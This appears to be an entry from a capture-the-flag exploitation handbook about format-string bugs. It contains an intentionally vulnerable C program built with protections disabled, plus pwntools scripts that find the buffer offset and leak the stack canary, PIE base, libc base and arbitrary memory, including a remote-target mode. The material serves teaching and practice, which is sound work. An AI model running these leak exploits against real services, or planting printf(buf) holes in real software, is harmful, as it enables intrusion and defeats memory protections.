---
title: "Format String - Arbitrary Read and Stack Leaks"
category: pwn
subcategory: format-string
type: technique
tags: [format-string, fmtstr, fsb, printf, percent-n, arbitrary-read, info-leak, stack-leak, canary, pie, aslr, relro, got, plt, libc-base, one-gadget, pwntools, gef, pwndbg, checksec]
difficulty: medium
summary: "printf(user_input) leaks the stack with %p and any address with %s - the standard source of canary, PIE and libc leaks."
when_to_use:
  - "The program prints your input back and `%p` or `%x` produces hex instead of the literal text"
  - "Source shows printf(buf) / fprintf(f, buf) / sprintf(out, buf) with no format literal"
  - "You need a canary, PIE base or libc base before a ROP chain"
  - "gcc warns `format not a string literal and no format arguments`"
tools: [pwntools, gdb, gef, pwndbg, checksec, one-gadget]
related: [fmtstr-arbitrary-write, fmtstr-advanced, mitigation-canary-bypass, mitigation-libc-identification, mitigation-modern-playbook, rop-ret2libc, rop-got-overwrite, pwntools-cheatsheet]
---

## TL;DR

`printf(buf)` where `buf` is attacker controlled lets `printf` read arguments that
were never pushed. `%p` walks whatever is on the stack; `%N$p` jumps straight to
slot N; `%s` dereferences a slot as a `char *`. That is a full arbitrary read as
soon as you can place your own pointer on the stack, which you can - the format
string itself lives on the stack.

## Recognise it

- You type `%p %p %p` and get `0x7ffd3a1c 0x1 0x7f2b...` back instead of the text.
- `AAAA%p.%p.%p` eventually prints `0x41414141`.
- Source (or decompiler output) shows a variadic call with a non-literal format:
  `printf(buf)`, `fprintf(stderr, msg)`, `syslog(LOG_INFO, user)`, `snprintf(o, n, user)`.
- `checksec` shows a canary you cannot brute force, but the binary echoes input.
- A "leave a comment / set your name" feature that prints the name back.

## Vulnerable source

```c
/* fmt.c - reads a line and prints it as a format string, in a loop. */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char secret[64] = "not-the-flag";

void vuln(void) {
    char buf[128];
    while (1) {
        printf("> ");
        fflush(stdout);
        if (!fgets(buf, sizeof buf, stdin)) return;
        if (buf[0] == 'q') return;
        printf(buf);          /* <-- the bug */
        fflush(stdout);
    }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin,  NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

```bash
# 32-bit, everything off - the teaching build
gcc -m32 -fno-stack-protector -no-pie -z norelro -z execstack \
    -Wno-format-security -o fmt32 fmt.c

# 64-bit with a canary and PIE - the realistic build you will actually leak from
gcc -fstack-protector-all -pie -fPIE -Wno-format-security -o fmt64 fmt.c

# Confirm
checksec --file=./fmt64
```

## Theory

`printf` has no idea how many arguments it was given. It reads the format string
and, for every conversion, fetches the next argument from wherever the calling
convention says arguments live.

### i386 (cdecl)

All arguments live on the stack, directly above the saved return address of
`printf`. So `%p` number 1 reads the first stack slot after the format pointer,
`%p` number 2 the next, and so on. Your buffer is also on the stack, usually only
a few slots away, which is why `AAAA%p%p%p%p` eventually prints `0x41414141`.

```text
esp -> [ format ptr ][ arg1 ][ arg2 ][ arg3 ] ... [ ... your buf ... ]
          %1$p ------^        ^        ^
```

### x86-64 (System V)

The first six variadic arguments come from `rdi, rsi, rdx, rcx, r8, r9`. `rdi`
holds the format string itself, so `%1$p .. %5$p` print `rsi, rdx, rcx, r8, r9` -
leftover register garbage. **`%6$p` is the first actual stack slot** at `rsp`.
Your buffer therefore starts at `%6$p` plus however deep the buffer sits.

```text
rdi = format   rsi rdx rcx r8 r9  =  %1$p .. %5$p
rsp -> slot0 = %6$p, slot1 = %7$p, slot2 = %8$p, ...
```

### Conversions that read

| Spec | Reads | Notes |
|------|-------|-------|
| `%p` | one word as a pointer | `(nil)` when the value is 0 |
| `%x` | 4 bytes | works on both arches, always 32-bit |
| `%lx` | 8 bytes on x86-64 | use when you want full words |
| `%s` | the word, then dereferences it | SIGSEGV on a bad pointer - kills the process |
| `%N$p` | slot N directly | "direct parameter access", the key to precision |
| `%c` | one byte | mostly used as padding for `%n` |
| `%.*s` | precision from the stack | rarely needed |

`%s` is the arbitrary read. To use it you need the target address to be *on the
stack at a slot you can index*. The easiest way: put it in your own format string,
because the format string is on the stack.

## Finding your offset

Send a known marker and a direct-parameter-access scan, then look for the marker
in the output.

```text
i386   : AAAA%1$p.%2$p.%3$p...   -> look for 0x41414141
x86-64 : AAAAAAAA%6$p.%7$p...    -> look for 0x4141414141414141
```

Typical results (always measure): i386 locals land at `%4$p`-`%7$p`, x86-64
locals at `%6$p`-`%10$p`, and a buffer in `.bss` never appears at all - see
fmtstr-advanced for that case.

```python
#!/usr/bin/env python3
"""Find the format-string offset of your own buffer, automatically."""
import sys

from pwn import *

context.binary = exe = ELF(sys.argv[1] if len(sys.argv) > 1 else './fmt64',
                           checksec=False)
context.log_level = 'error'

MARK = b'AAAAAAAA' if context.bits == 64 else b'AAAA'
WANT = MARK.hex()

start = 1 if context.bits == 32 else 6
for i in range(start, 40):
    io = process(exe.path)
    io.sendlineafter(b'> ', MARK + b'%' + str(i).encode() + b'$p')
    out = io.recvline()
    io.sendlineafter(b'> ', b'q')
    io.close()
    if WANT.encode() in out.lower().replace(b'0x', b''):
        context.log_level = 'info'
        log.success('buffer offset = %d  (payload: %%%d$p)', i, i)
        break
else:
    log.error('no offset found in 1..40 - buffer may not be on the stack')
```

## Attack

1. Find the offset of your buffer (`OFF`).
2. Dump the stack with `%p` and read off the interesting values:
   - a value ending in `00` with 6 nonzero bytes above it -> the **canary**
   - an address near the binary's text -> **PIE base** material
   - a `0x7f...` address -> **libc** material
3. Match a leaked value to a symbol by running once under gdb and comparing:
   `vmmap` gives the libc base, subtract it from the leak to get the offset.
4. For a chosen address, use `%s` with the address embedded in the payload.

### Which stack slot holds what

```gdb
b *vuln+<offset_of_printf_call>
c
telescope $rsp 30      # gef/pwndbg colour-code libc/heap/stack/code pointers
```

A reliable libc anchor is the saved return address of `__libc_start_main` -
it sits at a fixed stack depth for a given binary and glibc, so
`leak - libc_start_main_ret_offset = libc_base`.

## Exploit

```python
#!/usr/bin/env python3
"""fmtstr-read-leak: dump the stack, then leak canary + PIE + libc, then
read an arbitrary address with %s.

    python3 exploit.py
    python3 exploit.py GDB
    python3 exploit.py REMOTE HOST=host PORT=1337
"""
import os
import re
import sys

from pwn import *

EXE  = './fmt64'
HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context.binary = exe = ELF(EXE, checksec=False)
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF('./libc.so.6', checksec=False) if os.path.exists('./libc.so.6') else None

# Offset of OUR buffer in printf's argument list. Measure it, do not guess.
BUF_OFF = 6


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(EXE, gdbscript='b *printf\nc\n')
    return process(EXE)


def fmt(io, payload):
    """One printf round. Returns the echoed line."""
    io.sendlineafter(b'> ', payload)
    return io.recvline(keepends=False)


def classify(v):
    if v and (v & 0xff) == 0 and v >> 56:
        return 'canary candidate'
    if 0x7f0000000000 <= v < 0x800000000000:
        return 'libc or stack'
    if 0x550000000000 <= v < 0x580000000000:
        return 'PIE text/stack'
    return ''


def dump_stack(io, count=20):
    """Print slots 1..count so you can eyeball what is where."""
    slots = {}
    for i in range(1, count + 1):
        line = fmt(io, b'|%' + str(i).encode() + b'$p|')
        m = re.search(rb'\|(0x[0-9a-f]+)\|', line)
        if not m:
            log.info('%%%-3d$p = (nil)', i)
            continue
        v = int(m.group(1), 16)
        slots[i] = v
        log.info('%%%-3d$p = %#-20x %s', i, v, classify(v))
    return slots


def leak_at(io, addr):
    """Arbitrary read: conversions first, pointer last (it holds null bytes).

    Layout: [ '%<slot>$s' padded to a multiple of 8 ][ addr ]
    so the pointer lands exactly on stack slot `slot`.
    """
    for extra in range(4):
        slot = BUF_OFF + 1 + extra
        body = b'%' + str(slot).encode() + b'$s'
        pad = (-len(body)) % 8 + 8 * extra
        payload = body + b'.' * pad
        if BUF_OFF + len(payload) // 8 != slot:
            continue
        line = fmt(io, payload + p64(addr))
        return line[len(payload):] if len(line) > len(payload) else line
    return b''


def main():
    io = start()

    log.info('--- stack dump ---')
    slots = dump_stack(io)
    for i, v in slots.items():
        if classify(v) == 'canary candidate':
            log.success('canary (slot %d) = %#x', i, v)
            break

    # PIE base: pick the slot that holds a return address into our own text
    # (confirm which one in gdb ONCE), then subtract its static offset.
    RET_OFF = 0x1234                      # <- measure this for your binary
    for i, v in slots.items():
        if classify(v) == 'PIE text/stack':
            exe.address = v - RET_OFF
            log.success('PIE pointer (slot %d) = %#x', i, v)
            log.success('pie base (RET_OFF=%#x) = %#x', RET_OFF, exe.address)
            break

    # libc base via an arbitrary read of a GOT entry.
    if libc is not None:
        raw = leak_at(io, exe.got['puts'])
        val = u64(raw[:6].ljust(8, b'\x00'))
        libc.address = val - libc.symbols['puts']
        log.success('puts@libc = %#x', val)
        log.success('libc base = %#x', libc.address)
        log.success('system    = %#x', libc.symbols['system'])
        log.success('/bin/sh   = %#x', next(libc.search(b'/bin/sh\x00')))

    io.sendlineafter(b'> ', b'q')
    io.interactive()


if __name__ == '__main__':
    main()
```

## Leaking specific things

### The canary

```python
# Once you know the slot (find it in gdb with `canary` in gef/pwndbg):
io.sendlineafter(b'> ', b'%17$p')
canary = int(io.recvline(), 16)
assert canary & 0xff == 0, 'canary always ends in a null byte'
```

The terminator null byte is the tell: a genuine glibc stack canary has its low
byte zeroed so that `strcpy`-style reads stop there.

### libc base without a GOT read

```python
# __libc_start_main's return address is on the stack at a fixed depth.
# Measure the depth once locally, then:
io.sendlineafter(b'> ', b'%25$p')
ret = int(io.recvline(), 16)
libc.address = ret - 0x29d90        # offset of __libc_start_call_main+N; MEASURE IT
```

To measure: run under gdb, `vmmap` for the libc base, then
`hex(leak - libc_base)` is the offset for that exact libc build. It changes with
every glibc version, so identify the libc first (see mitigation-libc-identification).

### A GOT entry with `%s`

```python
# i386 is easy: the address goes at the front, offset is small.
payload = p32(exe.got['puts']) + b'%4$s'
io.sendline(payload)
io.recvuntil(p32(exe.got['puts']))
leak = u32(io.recv(4))
```

On x86-64 the address contains null bytes, and `fgets`/`printf` stop at the first
`\x00` if the pointer is placed *before* the conversions. Put the conversions
first and the pointer last, padded to a word boundary - that is what `leak_at()`
above does.

## Variants & pitfalls

- **`%s` on a bad pointer kills the process.** If the service is a fork server you
  just lose one connection; if not, you get one shot per run. Validate pointers
  with `%p` first.
- **Output truncation.** `snprintf(out, 64, user)` caps how many characters you
  can produce, which matters much more for writes than reads.
- **Null bytes in the payload.** `fgets` keeps nulls (it stops at `\n`), but
  `scanf("%s")` and `strcpy` do not. Place pointers after the format text.
- **`%n` disabled.** `_FORTIFY_SOURCE=2` blocks `%n` when the format string lives
  in writable memory, but reads still work fine. Leaking is always available.
- **Buffer not on the stack.** If the format string is copied into `.bss` you
  cannot place your own pointer via `%N$`. See fmtstr-advanced for the
  pointer-chain technique.
- **`%p` prints `(nil)` for 0**, which breaks naive `int(x, 16)` parsing.
- **The offset moves between local and remote** when the environment differs
  (different `argv[0]` length, different env vars). Anchor on a value you can
  recognise rather than a hardcoded depth when you can.
- **32-bit `%x` vs 64-bit `%p`.** On x86-64 `%x` consumes a full 8-byte slot but
  prints only 4 bytes - use `%p` or `%lx` so your slot arithmetic stays sane.
- **One-shot binaries.** If `printf` is called once, do all your leaking in a
  single format string: `%6$p.%7$p.%8$p.%25$p` and parse the lot.

## Tools

```bash
# Spot the bug statically
gcc -Wformat -Wformat-security -c fmt.c          # the compiler warns on printf(buf)
grep -nE 'printf\s*\(\s*[a-z_]+\s*\)' *.c
objdump -d --no-show-raw-insn -M intel ./fmt64 | grep -B4 'call.*printf'

# Confirm the mitigations
checksec --file=./fmt64
readelf -d ./fmt64 | grep -i bind_now           # full RELRO?

# Leak reconnaissance in gdb
gdb -q ./fmt64
#   b *printf
#   c
#   telescope $rsp 40      (pwndbg)  /  dereference $rsp 40  (gef)
#   canary
#   vmmap
```

